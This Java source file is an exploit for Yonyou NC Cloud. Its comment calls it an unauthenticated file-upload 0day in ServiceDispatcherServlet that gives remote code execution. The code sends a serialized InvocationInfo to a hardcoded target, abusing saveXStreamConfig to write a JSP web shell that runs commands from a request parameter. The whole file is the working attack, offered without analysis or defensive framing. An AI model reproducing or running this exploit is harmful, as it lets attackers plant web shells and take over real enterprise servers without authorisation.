import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.comn.Result;
import nc.bs.framework.exception.ConnectorException;
import nc.bs.framework.rmi.Address;
import nc.bs.framework.rmi.RemoteChannel;
import nc.bs.framework.rmi.RemoteChannelFactory;
import nc.bs.framework.rmi.RemoteChannelFactoryManager;


import java.io.ByteArrayInputStream;
import java.io.FileInputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;


/**
 * 未授权任意文件上传，RCE成功
 * nc.bs.framework.comn.serv.CommonServletDispatcher 0day
 *
 * 新版yonbip做了修复，该exp仅适用于ncc
 * **/

public class ServiceDispatcherServlet_exp2 {
    public static void main(String[] args) throws Throwable {



        String paylaod = "${Runtime.getRuntime().exec(param.cmd)}";
        InvocationInfo invocationInfo = new InvocationInfo("->nc.itf.iufo.IBaseSPService","saveXStreamConfig",new Class[]{Object.class, String.class},new Object[]{paylaod,"./hotwebs/uapws/ws3333.jsp"},"2222222");



        //
        System.setProperty("ncc.myLine","true");
        Address target = new Address("http://172.16.207.150:18888/ServiceDispatcherServlet");
//        RemoteChannelFactory rcf = RemoteChannelFactoryManager.getDefault().getRemoteChannelFactory(target.getProtocol());
        HttpRemoteChannelFactory rcf = new HttpRemoteChannelFactory();
        if (rcf == null) {
            throw new ConnectorException("not support target address:" + target);
        } else {
            RemoteChannel rc = null;
            Result ret = null;

            Object var19;
            try {

                rc = rcf.createRemoteChannel(target);
                rc.init();
                RemoteUtil.writeObject(rc.getOutputStream(), invocationInfo);
                ret = (Result)RemoteUtil.readObject(rc.getInputStream(), (boolean[])null);
                if (ret.appexception != null) {
                    throw ret.appexception;
                }

                var19 = ret.result;
            }  finally {
                if (rc != null) {
                    rc.destroy();
                }
            }

        }

    }
}
